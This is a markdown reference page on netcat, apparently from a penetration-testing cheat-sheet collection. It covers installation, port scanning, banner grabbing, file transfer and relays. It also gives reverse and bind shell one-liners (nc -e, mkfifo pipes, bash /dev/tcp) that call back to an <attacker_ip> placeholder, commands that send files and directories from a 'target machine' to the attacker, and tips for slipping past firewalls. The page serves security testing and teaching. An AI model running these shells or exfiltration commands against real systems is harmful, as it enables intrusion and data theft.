---
title: "nc (netcat)"
category: "networking"
tags: ["netcat", "reverse-shell", "file-transfer", "networking", "tcp", "udp", "ncat"]
---

# nc (netcat)

## Overview

Netcat (nc) is a versatile command-line networking utility often called the "Swiss Army knife" of networking. It reads and writes data across network connections using TCP or UDP protocols. Penetration testers use netcat for port scanning, banner grabbing, file transfers, and most importantly, establishing reverse and bind shells. Multiple variants exist including the original netcat, netcat-openbsd, and ncat (from the Nmap project).

## Installation

Netcat variants are typically pre-installed on Kali Linux. For other systems:

```bash
# Install netcat-openbsd (recommended, safer)
sudo apt update
sudo apt install netcat-openbsd

# Install netcat-traditional (has -e option)
sudo apt install netcat-traditional

# Install ncat (Nmap's modern netcat)
sudo apt install ncat

# Switch between variants on Debian/Ubuntu
sudo update-alternatives --config nc

# Verify installation
nc -h
ncat --version
```

## Netcat Variants

| Variant | Package | Key Features |
|---------|---------|--------------|
| **nc.traditional** | netcat-traditional | Original version, supports `-e` for command execution |
| **nc.openbsd** | netcat-openbsd | Safer reimplementation, no `-e` by default, supports `-X` proxy |
| **ncat** | ncat | Modern version from Nmap, SSL support, access control, connection brokering |

## Basic Usage

```bash
# Common options:
# -l    Listen mode (server)
# -v    Verbose output
# -n    Skip DNS resolution
# -p    Specify port
# -e    Execute command on connection (nc.traditional only)
# -c    Execute command via /bin/sh (nc.traditional only)
# -u    UDP mode (default is TCP)
# -w    Timeout in seconds
# -z    Zero-I/O mode (scanning)
# -k    Keep listening after client disconnects (ncat)

# Basic connection to a host
nc <target_ip> <port>

# Listen on a port
nc -lvnp <port>

# Connect with verbose output
nc -v <target_ip> <port>
```

## Key Features

### Network Connectivity
- TCP and UDP client/server connections
- IPv4 and IPv6 support
- Proxy support (SOCKS, HTTP)
- SSL/TLS encryption (ncat)

### Information Gathering
- Port scanning
- Banner grabbing
- Service identification

### Data Transfer
- File transfers
- Relay and proxy functionality
- Network debugging

### Shell Access
- Reverse shell establishment
- Bind shell creation
- Command execution

## Common Use Cases

### Setting Up a Listener (Attacker Machine)

```bash
# Basic TCP listener
nc -lvnp 4444

# Keep listening after client disconnects (ncat)
ncat -lvnkp 4444

# Listen with SSL encryption (ncat)
ncat --ssl -lvnp 4444

# Listen on UDP
nc -lvnup 4444
```

### Reverse Shell (Target Machine)

Using nc.traditional with -e:
```bash
# Connect back with bash
nc <attacker_ip> 4444 -e /bin/bash

# Connect back with sh
nc <attacker_ip> 4444 -e /bin/sh
```

When -e is not available (most modern versions), use these alternatives:

```bash
# Using mkfifo (named pipe) - most reliable
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f

# Using bash /dev/tcp (no netcat required on target)
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1

# Using exec
nc <attacker_ip> 4444 0<&1 | /bin/sh 1>&0 2>&0
```

### Bind Shell (Target Machine)

```bash
# Listen and provide shell to anyone who connects
nc -lvnp 4444 -e /bin/bash

# When -e not available
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f
```

### Port Scanning

```bash
# Scan a single port
nc -zv <target_ip> 80

# Scan a range of ports
nc -zv <target_ip> 20-100

# Scan with timeout
nc -zvw 1 <target_ip> 1-1000 2>&1 | grep succeeded

# UDP port scan
nc -zvu <target_ip> 53
```

### Banner Grabbing

```bash
# Grab HTTP banner
echo "" | nc -v <target_ip> 80

# Grab SSH banner
nc -v <target_ip> 22

# Grab SMTP banner
nc -v <target_ip> 25
```

### File Transfer

Receiver (set up first):
```bash
# Receive file on attacker machine
nc -lvnp 4444 > received_file.txt
```

Sender:
```bash
# Send file from target machine
nc <attacker_ip> 4444 < file_to_send.txt

# Send with cat
cat file_to_send.txt | nc <attacker_ip> 4444
```

Alternatively, sender listens and receiver connects:
```bash
# Sender listens
nc -lvnp 4444 < file_to_send.txt

# Receiver connects
nc <sender_ip> 4444 > received_file.txt
```

### Transfer Directory (with tar)

Receiver:
```bash
nc -lvnp 4444 | tar xvf -
```

Sender:
```bash
tar cvf - /path/to/directory | nc <receiver_ip> 4444
```

### Chat Between Two Machines

Machine A (listener):
```bash
nc -lvnp 4444
```

Machine B (connector):
```bash
nc <machine_a_ip> 4444
```

### Port Forwarding / Relay

Using ncat for a simple relay:
```bash
# Forward local port to remote host
ncat -l 8080 --sh-exec "ncat target_ip 80"

# Using named pipes (works with any nc)
mkfifo /tmp/pipe
nc -lvnp 8080 < /tmp/pipe | nc target_ip 80 > /tmp/pipe
```

### HTTP Request

```bash
# Simple GET request
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80

# POST request
echo -e "POST /login HTTP/1.1\r\nHost: example.com\r\nContent-Length: 27\r\n\r\nusername=admin&password=pwd" | nc example.com 80
```

### Simple Web Server

```bash
# Serve a single file once
while true; do nc -lvnp 8080 < index.html; done

# Respond with custom content
while true; do echo -e "HTTP/1.1 200 OK\n\nHello World" | nc -lvnp 8080; done
```

### Using ncat with SSL

```bash
# Connect to HTTPS service
ncat --ssl <target_ip> 443

# Create SSL listener
ncat --ssl -lvnp 4444

# Connect to SSL listener
ncat --ssl <attacker_ip> 4444
```

### ncat Access Control

```bash
# Only allow specific IP
ncat -lvnp 4444 --allow 192.168.1.100

# Allow subnet
ncat -lvnp 4444 --allow 192.168.1.0/24

# Deny specific IP
ncat -lvnp 4444 --deny 192.168.1.200
```

## Tips and Best Practices

1. **Use rlwrap for Better Shell Experience**: Wrap nc with rlwrap for command history and arrow key support:
   ```bash
   rlwrap nc -lvnp 4444
   ```

2. **Upgrade Your Shell**: After catching a reverse shell, upgrade to a fully interactive TTY:
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   # Then press Ctrl+Z
   stty raw -echo; fg
   export TERM=xterm
   ```

3. **Use Non-Standard Ports**: Avoid common ports like 4444. Use ports that may bypass firewall rules (80, 443, 8080).

4. **ncat for Modern Features**: Use ncat when you need SSL encryption, access control, or persistent listening.

5. **Check Which Variant is Installed**:
   ```bash
   ls -la /usr/bin/nc
   nc -h 2>&1 | head -5
   ```

6. **Firewall Considerations**: Reverse shells are often more successful than bind shells because they initiate outbound connections.

7. **UDP for Firewalls**: Some firewalls are less strict with UDP. Try UDP connections if TCP fails.

8. **Keep Sessions Alive**: Use `-k` with ncat to keep listening after disconnections.

9. **Data Transfers Are Unencrypted**: Standard netcat transfers data in plaintext. Use ncat with SSL for sensitive data.

10. **Clean Up**: Remove any named pipes (`/tmp/f`) created for reverse shells after testing.

## Related Tools

- **rlwrap** - Adds readline support for command history in shells
- **socat** - More advanced socket tool, supports PTY allocation
- **ncat** - Feature-rich netcat from Nmap project
- **pwncat** - Python netcat replacement with shell upgrade capabilities
- **chisel** - TCP/UDP tunnel over HTTP
- **cryptcat** - Netcat with built-in encryption
- **powercat** - PowerShell version of netcat for Windows
